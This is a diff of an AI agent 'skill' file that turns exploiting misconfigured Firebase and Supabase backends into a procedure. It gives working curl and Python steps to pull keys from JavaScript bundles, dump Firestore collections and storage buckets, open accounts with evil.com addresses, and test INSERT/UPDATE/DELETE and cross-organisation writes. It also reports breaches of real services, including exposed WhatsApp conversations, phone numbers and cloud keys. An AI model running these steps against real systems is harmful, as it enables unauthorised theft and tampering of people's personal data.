@@ -1,24 +1,22 @@
 ---
 name: firebase-supabase-attack
 description: Exploit Firebase/Supabase for data via JS config leak probe.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, firebase, supabase, firestore, cloud, data-breach]
-    category: recon
-    related_skills:
-      - api-noauth-hunt
-      - js-secrets-extraction
-      - source-leak-hunt
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [recon, firebase, supabase, firestore, cloud, data-breach]
+category: recon
+related_skills:
+  - api-noauth-hunt
+  - js-secrets-extraction
+  - source-leak-hunt
 ---
 
 # Firebase & Supabase Attack Skill
 
-Exploit misconfigured Firebase (Firestore, Storage, Auth) and Supabase (REST API, Storage, Auth) backends. These BaaS platforms are the #1 source of massive data breaches in modern web apps when Row Level Security (RLS) is missing and API keys leak in JavaScript bundles. Confirmed on Brendi (204K WhatsApp conversations, 173K phone numbers), Visafy (64K users, 46K reports), Smart Fit (39K users, 5 Firebase projects, 21 credentials), agendadentista (9 clinics, 1,749 leads).
+Exploit misconfigured Firebase (Firestore, Storage, Auth) and Supabase (REST API, Storage, Auth) backends. These BaaS platforms are the #1 source of massive data breaches in modern web apps when Row Level Security (RLS) is missing and API keys leak in JavaScript bundles. Confirmed on delivery-platform (204K WhatsApp conversations, 173K phone numbers), visa-processing-platform (64K users, 46K reports), fitness-chain (39K users, 5 Firebase projects, 21 credentials), dental-booking (9 clinics, 1,749 leads).
 
 ## When to Use
 
@@ -29,7 +27,7 @@ Exploit misconfigured Firebase (Firestore, Storage, Auth) and Supabase (REST API
 
 ## Prerequisites
 
-- `terminal` tool with curl, python3, jq.
+- `terminal` with curl, python3, jq.
 - Firebase project ID or Supabase URL + anon key (from JS bundle, source leak, or recon).
 - For Firebase SA key exploitation: `python3` with `google-auth` library.
 
@@ -37,14 +35,14 @@ Exploit misconfigured Firebase (Firestore, Storage, Auth) and Supabase (REST API
 
 ```bash
 # Firebase Firestore — list collections (if public)
-curl -sk "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/"
+curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/"
 
 # Supabase — list users table (if RLS missing)
-curl -sk "https://PROJECT.supabase.co/rest/v1/users" \
+curl --max-time 30 --connect-timeout 10 -sk "https://PROJECT.supabase.co/rest/v1/users" \
   -H "apikey: ANON_KEY" -H "Authorization: Bearer ANON_KEY"
 
 # Supabase — test signup (if open)
-curl -sk -X POST "https://PROJECT.supabase.co/auth/v1/signup" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://PROJECT.supabase.co/auth/v1/signup" \
   -H "apikey: ANON_KEY" -H "Content-Type: application/json" \
   -d '{"email":"test@evil.com","password":"Test123!"}'
 ```
@@ -53,13 +51,13 @@ curl -sk -X POST "https://PROJECT.supabase.co/auth/v1/signup" \
 
 | Platform | What to Find | Exploit Path | Real Example |
 |----------|-------------|-------------|--------------|
-| Firebase Firestore | Public database rules | Direct REST API access, list all collections | Brendi: 204K conversations public |
-| Firebase Storage | Public bucket rules | Download all files via REST API | Brendi: 1,000+ WhatsApp audio files public |
-| Firebase Auth | Open signup | Create accounts, access protected resources | Smart Fit: Firebase Auth signup open |
-| Firebase SA Key | Service account JSON | GCP IAM escalation, access all GCP resources | Smart Fit: 5 SA keys → full GCP access |
-| Supabase REST | Missing RLS | SELECT/INSERT/UPDATE/DELETE on any table | Visafy: 64K users, 46K reports, DELETE confirmed |
-| Supabase Storage | Public buckets | Download all files, upload malicious content | Visafy: public PDF reports bucket |
-| Supabase Auth | Open signup | Create accounts, bypass access controls | agendadentista: open signup + auto-confirm |
+| Firebase Firestore | Public database rules | Direct REST API access, list all collections | delivery-platform: 204K conversations public |
+| Firebase Storage | Public bucket rules | Download all files via REST API | delivery-platform: 1,000+ WhatsApp audio files public |
+| Firebase Auth | Open signup | Create accounts, access protected resources | fitness-chain: Firebase Auth signup open |
+| Firebase SA Key | Service account JSON | GCP IAM escalation, access all GCP resources | fitness-chain: 5 SA keys → full GCP access |
+| Supabase REST | Missing RLS | SELECT/INSERT/UPDATE/DELETE on any table | visa-processing-platform: 64K users, 46K reports, DELETE confirmed |
+| Supabase Storage | Public buckets | Download all files, upload malicious content | visa-processing-platform: public PDF reports bucket |
+| Supabase Auth | Open signup | Create accounts, bypass access controls | dental-booking: open signup + auto-confirm |
 
 ## Procedure
 
@@ -67,34 +65,34 @@ curl -sk -X POST "https://PROJECT.supabase.co/auth/v1/signup" \
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/firebase_supabase/$TARGET"
+OUTDIR="$OUTDIR/firebase_supabase/$TARGET"
 mkdir -p "$OUTDIR"
 
 # Download homepage and common JS entry points
-curl -sk "https://$TARGET/" -o "$OUTDIR/index.html"
-curl -sk "https://$TARGET/app.js" -o "$OUTDIR/app.js" 2>/dev/null
-curl -sk "https://$TARGET/main.js" -o "$OUTDIR/main.js" 2>/dev/null
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/" -o "$OUTDIR/index.html"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/app.js" -o "$OUTDIR/app.js" 2>/dev/null
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/main.js" -o "$OUTDIR/main.js" 2>/dev/null
 
 echo "[*] Extracting Firebase/Supabase configs..."
 
 # Firebase config pattern
-grep -oP 'apiKey["\s:]+["][^"]+["]|projectId["\s:]+["][^"]+["]|firebase\.initializeApp' \
+grep -Eo 'apiKey["\s:]+["][^"]+["]|projectId["\s:]+["][^"]+["]|firebase\.initializeApp' \
   "$OUTDIR"/*.html "$OUTDIR"/*.js 2>/dev/null | sort -u
 
 # Supabase config pattern
-grep -oP 'supabase\.co[^"'\'' ]+|supabaseUrl["\s:]+["][^"]+["]|supabaseKey["\s:]+["][^"]+["]|anon[_-]?key["\s:=]+["][^"]{20,}["]' \
+grep -Eo 'supabase\.co[^"'\'' ]+|supabaseUrl["\s:]+["][^"]+["]|supabaseKey["\s:]+["][^"]+["]|anon[_-]?key["\s:=]+["][^"]{20,}["]' \
   "$OUTDIR"/*.html "$OUTDIR"/*.js 2>/dev/null | sort -u
 ```
 
 ### Phase 2 — Firebase Firestore Exploitation
 
 ```bash
-PROJECT_ID="$1"  # e.g., brendi-whatsapp-bot
+PROJECT_ID="$1"  # e.g., delivery-bot-platform
 
 echo "[*] Firestore enumeration for $PROJECT_ID"
 
 # List root collections (if public)
-curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/" | \
+curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/" | \
   python3 -c "
 import sys, json
 try:
@@ -122,7 +120,7 @@ COLLECTION="$2"  # e.g., conversationsV3, users, stores
 echo "[*] Accessing collection: $COLLECTION"
 
 # List documents in collection
-curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/$COLLECTION" | \
+curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/$COLLECTION" | \
   python3 -c "
 import sys, json
 data = json.load(sys.stdin)
@@ -142,7 +140,7 @@ elif 'error' in data:
 
 # Read a specific document
 DOC_ID="$3"  # from the listing above
-curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/$COLLECTION/$DOC_ID" | \
+curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/$COLLECTION/$DOC_ID" | \
   python3 -m json.tool 2>/dev/null | head -50
 ```
 
@@ -155,7 +153,7 @@ PROJECT_ID="$2"
 echo "[*] Testing Firebase Auth signup on $PROJECT_ID"
 
 # Sign up
-SIGNUP_RESP=$(curl -sk -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
+SIGNUP_RESP=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
   -H "Content-Type: application/json" \
   -d '{"email":"test-'$(date +%s)'@evil.com","password":"TestPass123!","returnSecureToken":true}')
 
@@ -166,7 +164,7 @@ if echo "$SIGNUP_RESP" | grep -q "idToken"; then
 
   # Now use this token with Firestore
   echo "[*] Testing Firestore access with ID token..."
-  curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/" \
+  curl --max-time 30 --connect-timeout 10 -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/" \
     -H "Authorization: Bearer $ID_TOKEN" | python3 -c "
 import sys, json
 data = json.load(sys.stdin)
@@ -191,7 +189,7 @@ BUCKET="${PROJECT_ID}.appspot.com"  # default bucket name
 echo "[*] Storage enumeration for $BUCKET"
 
 # List objects (if public)
-curl -sk "https://storage.googleapis.com/storage/v1/b/$BUCKET/o" | \
+curl --max-time 30 --connect-timeout 10 -sk "https://storage.googleapis.com/storage/v1/b/$BUCKET/o" | \
   python3 -c "
 import sys, json
 data = json.load(sys.stdin)
@@ -207,7 +205,7 @@ elif 'error' in data:
 
 # Download a specific file
 OBJECT_NAME="$2"  # from listing
-curl -sk "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/$OBJECT_NAME?alt=media" \
+curl --max-time 30 --connect-timeout 10 -sk "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/$OBJECT_NAME?alt=media" \
   -o "/tmp/firebase_$OBJECT_NAME"
 echo "[+] Downloaded to /tmp/firebase_$OBJECT_NAME"
 ```
@@ -226,18 +224,18 @@ TABLES=("users" "profiles" "organizations" "posts" "comments" "purchases"
         "messages" "conversations" "sessions" "audit_logs")
 
 for table in "${TABLES[@]}"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 \
     "$SUPABASE_URL/rest/v1/$table?limit=1" \
     -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" 2>/dev/null)
 
   if [[ "$code" == "200" ]]; then
-    count=$(curl -sk "$SUPABASE_URL/rest/v1/$table?limit=0" \
+    count=$(curl --max-time 30 --connect-timeout 10 -sk "$SUPABASE_URL/rest/v1/$table?limit=0" \
       -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
-      -H "Prefer: count=exact" -I 2>/dev/null | grep -i "content-range" | grep -oP '\d+(?=/\d+$)')
+      -H "Prefer: count=exact" -I 2>/dev/null | grep -i "content-range" | grep -Eo '\d+(?=/\d+$)')
     echo "  [TABLE] $table — HTTP 200 (${count:-?} rows)"
 
     # Fetch first 3 rows
-    curl -sk "$SUPABASE_URL/rest/v1/$table?limit=3" \
+    curl --max-time 30 --connect-timeout 10 -sk "$SUPABASE_URL/rest/v1/$table?limit=3" \
       -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" | \
       python3 -m json.tool 2>/dev/null | head -20
     echo ""
@@ -258,7 +256,7 @@ echo "[*] CRUD testing on $TABLE"
 
 # INSERT
 echo -n "  INSERT: "
-curl -sk -X POST "$SUPABASE_URL/rest/v1/$TABLE" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "$SUPABASE_URL/rest/v1/$TABLE" \
   -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
   -H "Content-Type: application/json" -H "Prefer: return=minimal" \
   -d '{"test":"rls_bypass_probe_'$(date +%s)'"}' \
@@ -267,7 +265,7 @@ echo ""
 
 # UPDATE (PATCH)
 echo -n "  UPDATE: "
-curl -sk -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?test=eq.RLS_BYPASS" \
+curl --max-time 30 --connect-timeout 10 -sk -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?test=eq.RLS_BYPASS" \
   -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
   -H "Content-Type: application/json" -H "Prefer: return=minimal" \
   -d '{"test":"rls_updated"}' \
@@ -276,7 +274,7 @@ echo ""
 
 # DELETE
 echo -n "  DELETE: "
-curl -sk -X DELETE "$SUPABASE_URL/rest/v1/$TABLE?test=eq.RLS_BYPASS" \
+curl --max-time 30 --connect-timeout 10 -sk -X DELETE "$SUPABASE_URL/rest/v1/$TABLE?test=eq.RLS_BYPASS" \
   -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
   -H "Prefer: return=minimal" \
   -o /dev/null -w "%{http_code}" 2>/dev/null
@@ -291,7 +289,7 @@ ANON_KEY="$2"
 
 echo "[*] Supabase Auth signup test"
 
-SIGNUP_RESP=$(curl -sk -X POST "$SUPABASE_URL/auth/v1/signup" \
+SIGNUP_RESP=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "$SUPABASE_URL/auth/v1/signup" \
   -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
   -d '{"email":"test-'$(date +%s)'@evil.com","password":"TestPass123!"}')
 
@@ -301,7 +299,7 @@ if echo "$SIGNUP_RESP" | grep -q "access_token"; then
   echo "  Access Token: ${ACCESS_TOKEN:0:50}..."
 
   # Test cross-org access (change organization_id in profile)
-  curl -sk -X PATCH "$SUPABASE_URL/rest/v1/profiles?id=eq.$(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['user']['id'])" 2>/dev/null)" \
+  curl --max-time 30 --connect-timeout 10 -sk -X PATCH "$SUPABASE_URL/rest/v1/profiles?id=eq.$(echo "$SIGNUP_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['user']['id'])" 2>/dev/null)" \
     -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ACCESS_TOKEN" \
     -H "Content-Type: application/json" -H "Prefer: return=representation" \
     -d '{"organization_id":1}' 2>/dev/null | python3 -m json.tool 2>/dev/null
@@ -313,20 +311,20 @@ fi
 
 ## Real Production Results
 
-### Brendi (Firebase)
+### delivery-platform (Firebase)
 - **Firestore `conversationsV3`**: 204K WhatsApp conversations, 173K unique phone numbers, 497 stores — PUBLICLY READABLE
 - **Firestore `stores`**: 4,000 stores with CNPJ, phone, GPS, menu — PATCH write confirmed
 - **Firebase Auth**: signup open, anyone can create accounts
 - **Storage**: 1,000+ MP3 audio files (WhatsApp voice messages) publicly accessible
 - **Impact**: Full customer communication data, store management access
 
-### Visafy (Supabase)
+### visa-processing-platform (Supabase)
 - **REST API**: Anon key grants full SELECT on users (64,105 records), relatorios (46,717), purchase (676)
 - **CRUD**: DELETE confirmed on relatorio_completo, UPDATE confirmed on etapa
 - **Auth**: signup open, email auto-confirmed
 - **Storage**: relatorios and videos buckets public
 
-### Smart Fit (Firebase — 5 projects, multi-cloud)
+### fitness-chain (Firebase — 5 projects, multi-cloud)
 - 5 Firebase projects, 21 hardcoded credentials (MySQL, SendGrid, OVH S3, Algolia, ChatSkills, Redis, reCAPTCHA)
 - Service Account keys → GCP IAM escalation (storage.admin, firebaseappcheck.admin, iam.serviceAccountTokenCreator)
 - 16,179 files in Firebase Storage
